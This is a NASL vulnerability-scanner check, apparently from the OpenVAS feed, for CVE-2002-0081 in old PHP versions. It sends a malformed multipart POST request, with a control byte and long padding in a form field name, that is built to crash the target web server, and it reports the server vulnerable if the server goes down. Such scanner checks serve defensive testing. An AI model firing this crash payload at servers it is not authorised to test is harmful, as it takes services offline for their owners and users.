# SPDX-FileCopyrightText: 2002 Thomas Reinke
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10867");
  script_version("2025-04-11T05:40:28+0000");
  script_tag(name:"last_modification", value:"2025-04-11 05:40:28 +0000 (Fri, 11 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/4183");
  script_cve_id("CVE-2002-0081");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("PHP < 4.1.2 POST File Uploads Vulnerabilities - Active Check");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2002 Thomas Reinke");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"There are several flaws in how PHP handles multipart/form-data
  POST requests, any one of which can allow an attacker to gain remote access to the system.");

  script_tag(name:"affected", value:"PHP versions prior to 4.1.2.");

  script_tag(name:"solution", value:"Update to version 4.1.2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_404.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

host = http_host_name(port:port);
hostnoport = http_host_name(dont_add_port:TRUE);

if(http_is_dead(port:port))
  exit(0);

files = http_get_kb_file_extensions(port:port, host:hostnoport, ext:"php*");

if(isnull(files))
  file = "/default.php";
else {
  files = make_list(files);
  file = files[0];
}

if(http_is_cgi_installed_ka(item:file, port:port)){

  boundary1 = string("-VTTEST!");
  boundary2 = string("--VTTEST!");
  clen = "567";
  dblq = raw_string(0x22);
  badb = raw_string(0x12);

  postdata = string("POST ", file, " HTTP/1.1\r\n", "Host: ", host, "\r\n");
  postdata = string(postdata, "Referer: http://", host, "/", file, "\r\n");
  postdata = string(postdata, "Content-type: multipart/form-data; boundary=", boundary1, "\r\n");
  postdata = string(postdata, "Content-Length: ", clen, "\r\n\r\n", boundary2, "\r\n");
  postdata = string(postdata, "Content-Disposition: form-data; name=");

  len = strlen(dblq) + strlen(badb) + strlen(dblq);
  big = crap(clen - len);
  postdata = string(postdata, dblq, badb, dblq, big, dblq);

  soc = http_open_socket(port);
  if(!soc)exit(0);

  send(socket:soc, data:postdata);

  r = http_recv(socket:soc);
  if(http_is_dead(port:port)) {
    close(soc);
    report = http_report_vuln_url(port:port, url:file);
    security_message(port:port, data:report);
    exit(0);
  }
  http_close_socket(soc);
}

exit(99);
